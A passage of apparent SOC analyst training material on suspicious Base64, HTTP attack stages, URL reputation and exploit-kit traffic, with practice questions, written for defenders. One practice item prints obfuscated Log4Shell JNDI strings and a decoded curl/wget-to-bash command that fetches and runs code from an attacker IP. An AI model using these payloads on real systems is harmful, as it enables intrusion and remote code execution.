Server-signed; whoever steals the signing key can forge it Cookies and session values Many web frameworks Common

[Caution] Basic auth is effectively plaintext. The value after Authorization: Basic is just user:password Base64-encoded. If that header crosses http (unencrypted) or lands in a log, the password is exposed.

docs.title: Questions that separate suspicious Base64
docs.text:
Base64 is common in legitimate traffic, so "there's Base64 here" settles nothing. Ask instead:

  1. "Why encode this here?" — most ordinary POST data can be sent unencoded. Deliberate wrapping may mean something is being hidden.
  2. Is the destination trustworthy? — never-seen or newly registered domains, bare IPs
  3. Is the User-Agent normal? — non-browser, outdated, or odd values
  4. Does it repeat? — the same-shaped Base64 going back and forth at regular intervals (a beacon)

Two requests for example:

GET /news/list.asp HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: info.weekly-digest-mail.example
Cookie: sid=aG9zdD1XUy0wMjMxO3VzZXI9YS5uZ3V5ZW47YXY9RGVmZW5kZXI=

POST /cgi/stat.php HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Win32)
Host: two-rabbits-cdn.example
Content-Length: 1484

TVqQAAMAAAAEAAAA//8AAAC4AAAAAAAAAEAAAAAA...

Request 1:

  • Base64 in a cookie — "could be" on its own
  • Decodes to host=WS-0231;user=a.nguyen;av=Defender → not a session ID but PC, user and antivirus details
  • User-Agent is IE6 on Windows XP (NT 5.1) — impossible in 2026
  • An unfamiliar host → three signals stack: strong suspicion

Request 2:

  • A Base64 POST body — "why?"
  • Starts with TVqQ → an executable is being moved (sending back a tool, or a next-stage payload)
  • User-Agent Mozilla/5.0 (compatible; Win32) — a short fake no real browser sends
  • An unfamiliar host

Attackers like Base64 for two reasons: it carries binary data over text channels (HTTP, SMTP), and it defeats signatures that look for literal content (e.g. alerting on MZ or cmd.exe in a body). MITRE ATT&CK lists it as T1132.001 (Data Encoding: Standard Encoding), used by a long list of groups and tools. It's common beyond HTTP too — you'll meet it again in suspicious endpoint command lines (PowerShell -enc).

Decoded but unreadable? Attackers often encrypt first, then Base64-wrap, so decoding yields random bytes. You've still confirmed it was valid Base64, and random-looking content (high entropy) is itself a clue that something encrypted is leaving.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

How Base64 works, how to recognise it, "encoding is not encryption" and "ask why it's encoded here and combine with other signals" all hold. It's still the most common encoding in C2, exfiltration and PowerShell obfuscation.

[Changed]

  • Layering is the default. Modern malware rarely uses Base64 alone: it adds XOR or AES before Base64, uses custom Base64 with a reshuffled alphabet, or mixes Base32, Base85 and hex. If standard decoding fails or yields garbage, don't conclude "not encoded" (ATT&CK T1132.002 Non-Standard Encoding).
  • JWTs are everywhere. Cloud, SaaS and API authentication runs on JWTs, so eyJ... is common in logs. The first two parts (header, payload) are readable by anyone, and since the token is itself an access pass, JWTs left in logs are theft targets.
  • Tools decode automatically. Many NDR, SIEM and EDR products decode Base64 and re-inspect the content, and PowerShell Script Block Logging (Event 4104) records the decoded command at execution time.
  • ViewState forgery is back in the spotlight. ASP.NET's Base64 __VIEWSTATE is protected by the server's signing key (MachineKey); as in 2025's SharePoint "ToolShell" attacks, stealing the key allows forging malicious ViewState for remote code execution (web servers, 2026 perspective).

[Caution] Wrong or risky if done the old way

  • Don't call something malicious just because Base64 appears. Legitimate uses abound.
  • Conversely, don't dismiss "decoded to weird bytes, so nothing". It may be encryption plus Base64.
  • Don't share logs containing Basic auth or JWTs carelessly. Decoding them yields passwords or valid access passes; redact values in reports.
  • Never run a decoded executable or script. Hash lookups or isolated analysis only.

docs.title: Question 1
docs.text:
What is each of these most likely to be originally? Answer from the first characters only, without decoding.

A: TVqQAAMAAAAEAAAA//8AAAC4AAAA...
B: H4sIAAAAAAAA/+y9B2AcSZYlJi9t...
C: JVBERi0xLjcKJeLjz9MKMSAwIG9i...
D: eyJhbGciOiJIUzI1NiIsInR5cCI6...
Answer and explanation
  • A — a Windows executable (EXE/DLL). TVqQ is the Base64 of MZ + 90 00; a whole executable is being carried
  • B — gzip data. H4sI is gzip's 1F 8B 08; decode, then decompress, to see the content
  • C — a PDF. JVBERi0 is %PDF-
  • D — JSON, often a JWT. eyJ is {"; alg and typ mean a JWT header

With the prefix table memorised, you can spot "an executable just went past" while skimming logs.

docs.title: Question 2
docs.text:
A request log for an internal web application shows this header, over http:// (unencrypted). What's the problem?

Authorization: Basic YWRtaW46U3VtbWVyMjAyNiE=
Answer and explanation

A Basic auth value is just user:password in Base64. It decodes to admin:Summer2026! — an admin account's username and password in plain sight.

Three problems:

  1. Over http, anyone on the path could read it (like a postcard).
  2. If the header is in logs, the password is exposed to every person and system that can read them.
  3. A season-plus-year password like Summer2026! is weak and falls to password spraying.

Response: change the password immediately, move the app to HTTPS, replace Basic auth with something safer such as company SSO if possible, and mask the header in logs. Also check where else this account has signed in.

docs.title: Question 3
docs.text:
A large POST went to a suspicious host with an entirely Base64 body. Decoding gives random bytes — no readable text, no known magic bytes. A colleague says "it wasn't Base64, or it's just junk". Are they right?

Answer and explanation

No. If it decoded cleanly, it was Base64. Random bytes after decoding most likely mean the data was encrypted (or compressed/XORed) first, then Base64-wrapped — a common attacker pattern. High-entropy, random-looking content is itself a clue that something encrypted is leaving.

Next:

  1. Combine with other signals — destination reputation and age, User-Agent, repetition, total volume to that destination
  2. Look at size — Base64 is about 1.33× the original, so estimate the original data volume to gauge the scale of exfiltration
  3. Check the host — which process connected at that time (Sysmon Event ID 3), and whether large archiving (7-Zip, rar.exe) or mass file reads happened just before
  4. If it looks like exfiltration, move to the data-exfiltration response procedure

docs.title: Attack Stages over HTTP, Choosing an Analysis Method, URL Reputation
Attack Stages over HTTP, Choosing an Analysis Method, URL Reputation
docs.text:
What this page covers

How attackers use HTTP in almost every stage of an attack (delivery, exploitation, installation, C2, exfiltration) and what each stage looks like in logs, whether to reach for automated or manual analysis first, the easiest first step — URL reputation — and its traps (bad URLs on good domains, "no result" ≠ safe), and how to investigate without leaking information (OPSEC, defanging). Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Changed]/[Caution] = what changed recently and what is risky if done the old way. HTTP fundamentals are in the HTTP section.

docs.title: Eight key points
docs.text:
1. HTTP is used in almost every attack stage, and each stage looks different in the logs.
  2. Go for fast answers first: automated (reputation, screenshots, sandboxes) → if that fails, manual (header and content analysis, file extraction, anomaly hunting).
  3. Each method suits different stages. Screenshots are great for phishing, useless for C2 addresses.
  4. URL reputation is the fastest way to confirm "this is malicious".
  5. No result ≠ clean. Brand-new addresses have no history anywhere.
  6. Good domain ≠ safe URL. Hacked blogs, cloud-shared files, watering holes.
  7. Looking up is not submitting. Submitting to public scanners exposes data and can tip off the attacker (OPSEC).
  8. Defang URLs in reports and tickets so they can't be clicked (hxxps://evil[.]example).

docs.title: HTTP is used in almost every attack stage
docs.text:
Why it matters. Nearly every organisation allows HTTP, so attacker traffic blends in. It delivers malicious files, steals passwords through phishing sites, and carries C2 and exfiltration. Analysts need to know what HTTP looks like at each stage of an attack.

A common frame for attack stages is Lockheed Martin's Cyber Kill Chain, which splits an attack into seven stages (it comes up again in other study pages on this site).

Stage Meaning How HTTP is used 1 Recon Research the target Attackers browse the company website and job ads (visible in our web server logs) 2 Weaponize Build the attack Happens on the attacker's side; usually invisible to us 3 Deliver Send the attack to the target Phishing links, malvertising, redirects from compromised sites, fake updates 4 Exploit Trigger execution Exploit kits, browser/plugin exploits, tricking the user into running something 5 Install Establish malware Executable and script downloads 6 C2 (Command & Control) Remote control Periodic GETs and POSTs 7 Actions on objectives Steal data, etc. Encoded or encrypted uploads

Here is how the stages might look in a proxy log (all domains are examples):

09:01:14  GET  https://parcel-redelivery.example/track?id=8812           200  text/html
09:01:20  GET  https://parcel-redelivery.example/dl/label.zip            200  application/zip
09:02:03  GET  http://203.0.113.71/u/update.ps1                          200  text/plain
09:05:00  POST https://api-telemetry-sync.example/gate                   200  text/html  (312 B)
09:10:00  POST https://api-telemetry-sync.example/gate                   200  text/html  (312 B)
13:47:31  POST https://api-telemetry-sync.example/upload                 200  text/html  (148 MB sent)
  • Line 1 Deliver: the user clicks a phishing link posing as a parcel redelivery
  • Line 2 Deliver/Exploit: a ZIP from that site (possibly containing an executable or script)
  • Line 3 Install: a PowerShell script fetched directly from an IP address, no domain
  • Lines 4–5 C2: small POSTs of identical size (312 bytes) to the same address exactly five minutes apart — a beacon
  • Line 6 Actions: 148 MB uploaded to the same C2 — exfiltration

Each line on its own looks ordinary; strung together in time order, the whole attack ran over HTTP.

[Added] Many SOCs now use the finer-grained MITRE ATT&CK more than the kill chain. In ATT&CK terms, the phishing link is T1566.002 (Spearphishing Link), web-protocol C2 is T1071.001 (Web Protocols) and exfiltration over the C2 channel is T1041 (Exfiltration Over C2 Channel). The kill chain describes the big flow; ATT&CK names specific techniques.

docs.title: Choosing an analysis method: fast answers first
docs.text:
Why it matters. Analyst time is limited; hours on one alert means others pile up. The skill is choosing the method that reaches the right answer fastest — without trading accuracy for speed.

Kind Method Strength Limit Automated URL/site reputation An answer in seconds New addresses have no history Automated Screenshot services See a phishing page at a glance Useless for C2 addresses (blank page) Automated Sandboxes (HTML analysis, full VM detonation) See real behaviour Takes time; some malware detects sandboxes Manual Header analysis (request/response) Exactly what was exchanged Costs analyst time Manual Content analysis, file extraction, anomaly hunting Finds what tools missed Slowest, needs skill

The usual order is quick automated checks → if there's no clear answer, go manual and deep. And match the method to the stage:

  • Phishing page (Deliver) → a screenshot is fastest; you can see a fake Microsoft login at a glance
  • Malicious download (Install) → file-hash reputation, sandbox
  • C2 address → a screenshot shows a blank page or a fake 404; you need header analysis and manual work on interval and size patterns

docs.title: The easiest first step: URL reputation
docs.text:
What it is. Looking up the "confirmed malicious URL" records collected by security vendors and communities worldwide. If someone has already confirmed the address as malicious, you can settle it in seconds — the fastest first step.

Well-known services (each with its own purpose and level of detail):

Service What it offers VirusTotal Verdicts on URLs, domains and file hashes from many engines at once urlscan.io Actually loads the page: screenshot, loaded resources, redirects URLhaus (abuse.ch) A list of malware-distribution URLs Google Safe Browsing transparency report Whether Chrome warns about the site Cisco Talos Intelligence IP and domain reputation

docs.title: Trap 1: no result ≠ clean
docs.text: Reputation only tells you what someone has already found and recorded. Attackers often register phishing domains, use them for a few hours and discard them; those show "0 engines detected" because nobody has seen them yet. "No bad record" is not "safe". A clean result means moving on to the next step (domain age, content analysis).

docs.title: Trap 2: good domain ≠ safe URL
docs.text:
The reputation of one URL is not the reputation of the whole domain. Malicious URLs can live on reputable domains:

https://www.small-bakery.example/wp-content/uploads/2026/11/inv.php
https://www.dropbox.com/scl/fi/a8k2.../Remittance_Advice.zip?dl=1
https://www.industry-association.example/news/2026-conference
  • Line 1 A hacked WordPress blog: the bakery's domain is old and clean, but an attacker planted a PHP file in its uploads folder
  • Line 2 A cloud-shared file: Dropbox has an excellent reputation, but anyone can upload files to it
  • Line 3 A watering hole: compromising an industry-association site the targets visit regularly and planting attack code on it — named after a predator waiting at the waterhole

So look up the full URL and the domain separately: search the domain to judge the whole domain, search the URL to judge this address. A good domain reputation doesn't vouch for everything on it.

docs.title: Reading a result
docs.text:
URL:        https://login-m365-secure.example/auth?client=office
Detections: 7 / 94 engines flagged as phishing
First seen: 2026-11-04 08:12 UTC (5 hours ago)
Domain age: 2 days
Final URL:  https://login-m365-secure.example/auth/index.php
Page title: "Sign in to your account"
  • 7/94 — 7 of 94 engines say phishing. It looks small, but engines take time to catch up on new addresses, so even a few detections matter
  • First seen 5 hours ago, domain 2 days old — freshly made
  • Page title "Sign in to your account" — mimics the Microsoft sign-in title
  • Taken together, effectively confirmed. Next: who visited and what did they enter

docs.title: [Added] Investigating without leaking information (OPSEC)
docs.text:
Also consider whether using reputation services fits your OPSEC (operational security) standards. Lookups come in levels:

Level What happens Risk Passive lookup Search existing results only Minimal Public submission The service visits and analyses the address; results are public Others can see it; the attacker may notice Private submission Only you see results (paid/configured) The service's visit still shows up in the attacker's server logs Our own isolated environment In-house sandbox or analysis VM Must be set up so the organisation's IP isn't exposed

Why care:

  • Public scan results are visible to anyone. Phishing URLs often embed the victim's email (Base64 after ?u=, etc.). Submitting publicly publishes your employee's address and the fact they were targeted. Wrongly submitting a legitimate URL with a token (password-reset or document-sharing links) can expose that document or account.
  • Attackers watch these services too. When their URL shows up, they know they're spotted and change addresses or clean up.
  • Never open a suspicious URL directly from a company PC or company IP. It tells the attacker's server logs that your organisation is investigating, and the PC could get infected.

[Added] Defanging. When writing suspicious URLs in reports, tickets or chat, change their shape so they can't be clicked or auto-linked:

https://login-m365-secure.example/auth   →   hxxps://login-m365-secure[.]example/auth
203.0.113.71                             →   203.0.113[.]71
  • http → hxxp, https → hxxps
  • dot . → [.]
  • The recipient reverses it (refangs) before feeding it to tools

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

"HTTP is used in almost every stage", "quick automated checks → manual when needed", "no result ≠ safe" and "good domain ≠ safe URL" all hold — the last more than ever as abuse of cloud services grows.

[Changed]

  • More ways to dodge reputation checks. Phishing domains live for hours, cloaking shows clean pages to security scanners, and phishing pages hide behind CAPTCHA or Cloudflare Turnstile challenges that automated scanners can't pass. What the scanner saw and what the victim saw can differ.
  • QR-code phishing (quishing) is common. A QR image in the email instead of a URL dodges email URL scanning and pushes the victim to an unmanaged personal phone. Decode the QR to extract the URL, then check its reputation.
  • Reputation checks are automated by default. SIEM/SOAR enrichment now queries URLs, domains and hashes from alerts against several services automatically; analysts spend their time interpreting results and going beyond them.
  • AI-generated phishing pages weaken old clues like awkward wording, while technical signals — domain age, certificate issuance time, hosting location — still work.

[Caution] Wrong or risky if done the old way

  • Don't close a case because reputation is clean. New domains, cloud hosting and challenge-gated pages may be unknown to reputation services.
  • Don't submit just any URL to public scanners. For URLs carrying victim data or tokens, strip parameters or use private options or an in-house isolated environment.
  • Don't open suspicious URLs from a company PC.

docs.title: Question 1
docs.text:
Which kill-chain stage does each proxy log line most likely represent?

A: POST https://cdn-metrics-api.example/beacon   (every 60 s, 256 B)
B: GET  https://hr-portal-update.example/review.html   (link from email)
C: GET  http://198.51.100.9/s/a.exe
D: POST https://cdn-metrics-api.example/up   (2.3 GB sent, 02:10)
Answer and explanation
  • A — C2 (stage 6). Small POSTs of identical size to the same address exactly every 60 seconds = a beacon.
  • B — Deliver (stage 3). A suspicious page opened from an email link = phishing delivery.
  • C — Install (stage 5). An executable fetched directly from an IP address, no domain; legitimate software normally uses domains and HTTPS.
  • D — Actions on objectives (stage 7), exfiltration. 2.3 GB uploaded to the C2 domain at 2 a.m.

Note A and D share a domain: data was exfiltrated over the C2 channel (ATT&CK T1041). Chaining stage traces in time order gives you the whole incident.

docs.title: Question 2
docs.text:
A staff member clicked a link from an email. VirusTotal shows 0/94 for the URL and urlscan.io has no record. Is "it's safe, closing the case" right? What else should you check?

Answer and explanation

No. No result only means nobody has recorded it yet. Phishing domains are often brand-new and short-lived, and cloaking or challenge pages dodge scanners.

Check further:

  1. Domain age and registration — a few days old is a strong signal
  2. Certificate issuance time — when the domain's first certificate appeared in Certificate Transparency (CT) logs
  3. Content, safely — load the page in an isolated analysis environment or via a private scan: does it imitate a login page?
  4. Our logs — did the staff member POST (enter credentials) to the site, and what did they receive afterwards?
  5. Other recipients — search the mail gateway for the same sender, subject or URL

docs.title: Question 3
docs.text:
A phishing email contains this URL:

https://login-verify.example/start?u=ai5zbWl0aEBjb3JwLmV4YW1wbGU=

Can you submit it as-is to a public scanner? What's the risk, and what should you do?

Answer and explanation

Not as-is. The value after u= is Base64 that decodes to j.smith@corp.example — your employee's email address.

Risks:

  1. The employee's email becomes public in the scan results, along with the fact that this person in your organisation was targeted.
  2. Phishing pages use such values to pre-fill the email field (looking more genuine) or to track who clicked. A scanner visiting the URL may look to the attacker like "j.smith opened the link", or signal that someone is investigating.

Instead:

  • Start with a passive lookup (existing results) on the domain
  • If you need the content, analyse a version with the parameter removed or replaced by a dummy value, using a private option or an in-house isolated environment
  • Record it defanged in reports: hxxps://login-verify[.]example/start?u=<redacted>
  • Then check your logs: did j.smith actually click, and enter credentials?

docs.title: Spotting Exploit Kits, and Malicious/Suspicious/Benign Practice
Spotting Exploit Kits, and Malicious/Suspicious/Benign Practice
docs.text:
What this page covers

How exploit kits infect users (compromised site or malicious ad → redirect → browser profiling → tailored exploit and payload), the clues that give exploit-kit traffic away and how to confirm whether an alert led to infection, and three practice judgements: a Log4Shell attack against our web server, a redirect chain through dynamic DNS to a malicious ZIP, and a C2 beacon posing as jQuery. Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Changed]/[Caution] = what changed recently and what is risky if done the old way. A line-by-line exploit-kit request and domain shadowing are on Judging Requests. All domains and IPs in the examples are invented.

docs.title: Eight key points
docs.text:
1. An exploit kit = automatic exploit selection + payload delivery. The user just opened a site they always visit — and got infected.
  2. The entry point is a redirect planted on a compromised legitimate site or in a malicious ad (malvertising).
  3. The best defence is patching the OS, browser and plugins. Kits carry a finite set of exploits; short of a zero-day, most fail against patched PCs.
  4. Traffic clues: several newly created domains, multiple IPs, random subdomains, long URLs and parameters, heavily obfuscated scripts — and, if it works, a file download at the end.
  5. When an alert fires, judge success not by "did it reach the kit" but by "did an executable or script arrive at the end, and did it run".
  6. Inbound attacks (Log4Shell, etc.) ride in every header, User-Agent and Referer included, not just the URL. Judge success by whether the server connected outward.
  7. Redirect chains hopping through several dynamic DNS (free subdomain) hosts are a strong malicious signal.
  8. Well-configured C2 (e.g. Cobalt Strike) looks like requests for normal files (jQuery, …). Check who serves it (Host), how often, and whether it's encrypted.

docs.title: How exploit kits infect
docs.text:
Why they're frightening. From the user's perspective they did nothing wrong: they opened an ordinary page they'd visited many times, but if an exploit kit had been injected, their PC could be compromised on the spot. No clicks, no trickery — just an unpatched browser in the wrong place at the wrong time, all invisible to the user.

Good (compromised) site / malicious ad
        │  hidden redirect (iframe, injected script)
        ▼
Exploit kit server (normal-looking web server)
        │  1. profile browser: User-Agent, plugins, versions
        │  2. pick a matching exploit from its collection
        │  3. deliver exploit + payload (can change per victim)
        ▼
Victim PC compromised (payload runs)
  • Entry: attackers hack a legitimate site and insert code into its pages, or buy malicious ads that spray redirects across many sites at once through an ad network
  • Profiling: the kit server behaves like a normal web server, using the User-Agent and scripts to learn the browser and installed plugin versions
  • Selection: it compares those against its exploit collection and builds a tailored package for this victim
  • Delivery: it sends the exploit plus a payload (ransomware, banking trojan, cryptominer — possibly different per victim)

Kit authors must keep collecting and updating exploits, and there are only so many. So keeping the OS, browser and every plugin up to date is the best defence; short of the rare zero-day (an unpatched vulnerability), most kits are harmless against a patched PC. Extensions that block third-party scripts on web pages also help.

docs.title: Spotting exploit-kit traffic
docs.text:
Kits differ in how they profile and redirect, but share trends:

Clue What it looks like Many domains and IPs Several unfamiliar hosts in a short span from one click Newly created domains Days-old registrations; random parent or subdomain names Long URLs and encoded parameters Meaningless long values after ? Obfuscated pages Deliberately unreadable JavaScript, nonsense text A file download on success A randomly named executable or script at the end of the chain

A typical chain in a proxy log (example):

14:02:11  GET  http://recipes-weekly.example/2026/11/soup.html            200  text/html      Referer: google.com
14:02:12  GET  http://k3x9q2.example-cdn-gate.example/?q=rT8xZ2&s=9Lw      302  -              Referer: recipes-weekly.example
14:02:12  GET  http://198.51.100.61/?Ym9vbT14OTI3NA&3a2f=Qk2xVhPz...       200  text/html      (obfuscated JS)
14:02:14  GET  http://198.51.100.61/?Zz7N1aR&49b1=pK0aYx...                200  application/x-shockwave-flash
14:02:16  GET  http://198.51.100.61/?Tq9Wm2&e81c=Hd3sLr...                 200  application/octet-stream  (412 KB)
  • Line 1 — the user opens a recipe blog from search (the blog is compromised)
  • Line 2 — a hidden redirect in the blog sends them to a "gate" on a random subdomain → 302 to the next stage
  • Line 3 — a landing page reached by IP with no domain, long random parameters, obfuscated JavaScript (browser profiling)
  • Line 4 — the tailored exploit (plugin exploits such as Flash used to be common)
  • Line 5 — a 412 KB binary at the end — the payload arrived; the attack probably succeeded

[Added] What to check when an alert fires. IDSs (Snort, Suricata, …) track kit URL patterns well and raise alerts like "possible exploit kit landing page". Then:

  1. Was it really a kit? Skim the traffic for a chain like the one above; if not, close as a false positive
  2. Was something delivered? Did an executable, script or archive arrive with a 200 at the end of the chain (Content-Type, Zeek resp_mime_types, size)?
  3. Did it run? Right afterwards, new processes (Sysmon 1 / 4688), new files (Sysmon 11), new outbound connections (Sysmon 3) on the PC?
  4. Where did it start? Follow the first Referer back to the compromised site and check other PCs that visited it

URL sandboxes may visit the site themselves, hit the kit and graph the redirect path.

docs.title: Practice 1: a request to our web server
docs.text:
Context: a request arriving at the organisation's public web server. Judge it yourself first, then expand the explanation.

GET /?x=${jndi:ldap://203.0.113.9:1389/Basic/Command/Base64/KGN1cmwgLXMgMjAzLjAuMTEzLjk6NTg3NC8xOTguNTEuMTAwLjIwOjgwfHx3Z2V0IC1xIC1PLSAyMDMuMC4xMTMuOTo1ODc0LzE5OC41MS4xMDAuMjA6ODApfGJhc2g=} HTTP/1.1
Host: 198.51.100.20
User-Agent: ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://203.0.113.9:1389/Basic/Command/Base64/KGN1cmwg...}
Referer: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://203.0.113.9:1389/Basic/Command/Base64/KGN1cmwg...}
Accept: */*
Verdict and explanation: malicious (attack attempt)

Clearly malicious. The URL, User-Agent and Referer all hold complex values that, looked at closely, all (some obfuscated) reference jndi, ldap and an embedded address:

  • URL: ${jndi:ldap://203.0.113.9:1389/...} — the easiest to see
  • User-Agent: ${lower:j} is Log4j syntax for "lowercase j"; joined up it reads jndi:ldap — obfuscation to dodge naive jndi string matching
  • Referer: ${::-j} resolves to "default value j"; again jndi:ldap

This is an attack on the Apache Log4j vulnerability (Log4Shell, CVE-2021-44228) disclosed in December 2021. The moment a Java program on the server logs this value with Log4j, Log4j treats ${jndi:ldap://...} as an instruction, the server itself connects out to 203.0.113.9:1389, and runs code it receives. That's why attackers spray the string into every field the server might log (URL, User-Agent, Referer, other headers).

Decoding the Base64. After Base64/ in each field:

(curl -s 203.0.113.9:5874/198.51.100.20:80||wget -q -O- 203.0.113.9:5874/198.51.100.20:80)|bash
  • curl -s 203.0.113.9:5874/... — quietly (-s) fetch content from port 5874 on the attacker's server
  • || — if the first command fails (no curl), run the next
  • wget -q -O- ... — fetch quietly (-q) with wget, writing to standard output (-O-)
  • | bash — run what was fetched as Linux shell commands
  • 198.51.100.20:80 in the path — the victim server's own IP and port, so the attacker can record "which server got hit" in the botnet's ledger

How to tell if it worked. A request arriving isn't success. The key is whether our server connected outward:

  1. Firewall or Zeek conn.log: did the web server make outbound connections to 203.0.113.9:1389 (LDAP) or :5874?
  2. Did the server's (Java) process spawn curl, wget, bash or sh (Linux audit logs, EDR)?
  3. Check the server's Log4j version and patch it

No outbound traces and patched → record a failed attempt, block the IP and review WAF rules.

docs.title: Practice 2: a request leaving a user's PC
docs.text:
Context: a request leaving a staff PC. The staff member had just clicked a link in a "check your tax notice" email.

GET /%35%41%5F%32%38%5F%35%42%5F%35%41%5F%31%32%38/ HTTP/1.1
Host: download2.dyn-hosting.example
Referer: http://fiscal-docs.ddns-free.example/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/144.0.0.0 Safari/537.36

HTTP/1.1 302 Found
Location: http://fiscal-notice.homeip-free.example/Nota.zip
Verdict and explanation: malicious (an intermediate step of a malware download)

Malicious, though no exploit is visible as in Practice 1. This is an intermediate step in downloading a malicious file. The whole story:

  1. A finance/tax-themed phishing email link → fiscal-docs.ddns-free.example
  2. That site sends the browser to this request (the Referer still shows the first site) → download2.dyn-hosting.example
  3. The 302 response sends it on to fiscal-notice.homeip-free.example/Nota.zip → the final malicious download

Clues:

  • Three dynamic DNS (free subdomain) hosts in a row. Dynamic DNS lets anyone create a "name → IP" mapping instantly for free, which attackers love; business traffic rarely needs these hosts
  • A strange URL-encoded path — decodes to meaningless 5A_28_5B_5A_128, hex-like until it falls apart
  • The flow itself: phishing email → several redirects → ZIP
  • The final name Nota.zip ("note/invoice" in Portuguese and Spanish) — a common finance-phishing lure

Strictly, this screen alone isn't 100% proof. But with this context and these signs there's ample reason to extract and inspect the ZIP — which in a case like this turns out to be malware.

[Added] Alert on dynamic DNS. Dynamic DNS services (No-IP, DuckDNS, Dynu, …) have legitimate home uses but are rare in enterprises, so alert or block rules on their domains work well. Each service uses dozens to hundreds of parent domains, so keep the list updated.

docs.title: Practice 3: a repeating request from a user's PC
docs.text:
Context: this request repeats from a staff PC about every 60 seconds, all day.

GET /jquery-3.3.1.min.js HTTP/1.1
Host: cdn-libs-update.example
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://code.jquery.com/
Cookie: __cfduid=Rk2xVhPzT8m1qW9cL0aYxN3sKe7bJ4dG6uF5tH2iZ...(about 170 chars)
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko

HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Content-Length: 5543
Verdict and explanation: malicious (C2 beacon) — the hardest of the three

Malicious — though this screen alone can't prove it; the most you can say is "odd at best". It's the traffic shape of Cobalt Strike's BEACON C2 malware on an infected PC. BEACON can be configured with any HTTP methods, protocols, headers and hosts, rotating among them, which makes it very hard for defenders. Here it's set up to pretend to download jQuery (a common web-page component) and talk through the cookie field.

Clues:

  • No reason to fetch jQuery this often. Browsers cache jQuery; fetching the same file every 60 seconds is a program
  • HTTP, not HTTPS — legitimate CDNs are almost all HTTPS now
  • The wrong source — real jQuery comes from code.jquery.com or a major CDN, but the Host is an unfamiliar cdn-libs-update.example. The Referer code.jquery.com is decoration; Host is where the request actually went
  • The __cfduid cookie — mimics an old Cloudflare cookie name (Cloudflare retired it in 2021), but the value is long and changes per request → data from the infected PC
  • A 5,543-byte response — the real minified jQuery 3.3.1 is about 85 KB. Far too small, and a beacon's size changes when commands are delivered

You can't read the cookie contents: Cobalt Strike encrypts its traffic and you don't have the keys. So you judge by pattern (interval, source, size), not content.

This shows how sneaky well-configured C2 traffic can be — and this one wasn't even HTTPS. Defenders need to know what major attack tools such as Cobalt Strike can do.

Next: identify the connecting process (Sysmon Event ID 3 — often not a browser, e.g. rundll32.exe or an injected legitimate process), extract the BEACON configuration from memory (public tools can pull C2 addresses and settings), block the domain, and find other PCs contacting the same host.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

"Patching is the best defence", "judge success by the file at the end of the chain and whether it ran", "inbound attacks ride in every header", "dynamic DNS is a good detection point" and "catch well-disguised C2 by pattern" all hold.

[Changed]

  • Exploit kits have declined sharply. Stronger browser security, the end of Flash (2020), Internet Explorer's retirement (2022) and arrests of kit authors mean very few kits remain active in the 2020s. Payloads shifted over time too — at one point from banking trojans to cryptominers. The "infected just by visiting" role has passed to malvertising plus fake installers, fake updates (SocGholish-style) and ClickFix (Judging Requests, 2026 perspective).
  • Log4Shell isn't over. Years after its 2021 disclosure, scanning and attacks against unpatched servers continue, and it's on CISA's Known Exploited Vulnerabilities (KEV) list. Seeing ${jndi: in public server logs is still routine.
  • C2 frameworks have diversified. Cobalt Strike is still widely used, but a 2024 European law-enforcement operation (Operation Morpheus) took down hundreds of servers running cracked copies, and attackers also moved to Sliver, Havoc, Brute Ratel, Mythic and others. All support "normal-looking HTTP(S) profiles", so the method stays the same: source, interval, size, process.
  • Free subdomain services multiplied. Beyond classic dynamic DNS, cloud platforms' free subdomains (Workers, Pages, …) and tunnel services are abused the same way.

[Caution] Wrong or risky if done the old way

  • Don't treat "exploit kit alert" as "infected". Confirm whether a file arrived and ran. Conversely, don't close it unverified just because the PC is patched.
  • Don't open URLs containing attack strings from a company PC or replay them at company servers. Analyse in isolation and record them defanged.
  • Detection that only matches strings like jndi is easily bypassed (${lower:j}ndi, …). Combine WAF/IDS rules that normalise (decode) before matching with outcome-based detection of the server connecting outward.

docs.title: Question 1
docs.text:
An IDS alert says "staff PC possibly accessed an exploit kit landing page". In what order do you check whether the PC was actually infected?

Answer and explanation
  1. Was it really a kit? — review proxy/Zeek traffic around the alert for a chain through several unfamiliar hosts and IPs, long random URLs and obfuscated scripts; if absent, possibly a false positive
  2. Was something delivered? — did an executable, script or archive arrive with a 200 at the end of the chain (Content-Type, resp_mime_types, size)? If nothing arrived, the attack likely failed
  3. Did it run? — new processes (Sysmon 1 / 4688), files (Sysmon 11) and outbound connections (Sysmon 3) right afterwards, especially the browser spawning an unfamiliar process
  4. Where did it start? — follow the first Referer to the compromised site or malicious ad and check other PCs that visited it
  5. Check the PC's browser and OS patch level

"Reached the kit" and "infected" are different; delivery and execution traces decide it.

docs.title: Question 2
docs.text:
You find a request in a public web server's log with ${${lower:j}ndi:ldap://203.0.113.9:1389/a} in the User-Agent, and the response code was 200. A colleague says "it's a 200, so the attack succeeded". Right? How do you judge success?

Answer and explanation

No. 200 only means the web server answered the page request normally. Log4Shell fires when the server logs the value with Log4j, regardless of the page response, so the status code can't tell you.

The test is whether the server connected outward:

  1. Firewall or Zeek conn.log: any outbound connection from the web server to 203.0.113.9:1389 (LDAP)? Public web servers rarely initiate outbound connections, so it stands out
  2. Further outbound connections on other ports (payload download)?
  3. Did the server's Java process spawn curl, wget, sh or bash (Linux audit logs, EDR)?
  4. Does the server actually run a vulnerable Log4j version?

Also, default-deny egress filtering on public web servers stops the second stage of attacks like this.

docs.title: Question 3
docs.text:
As in Practice 3, GET /jquery-3.3.1.min.js repeats every 60 seconds. The URL looks like an ordinary jQuery file — why is it suspicious, and what do you base the judgement on?

Answer and explanation

The URL is the easiest field to fake, so looking normal means nothing. Base the judgement on:

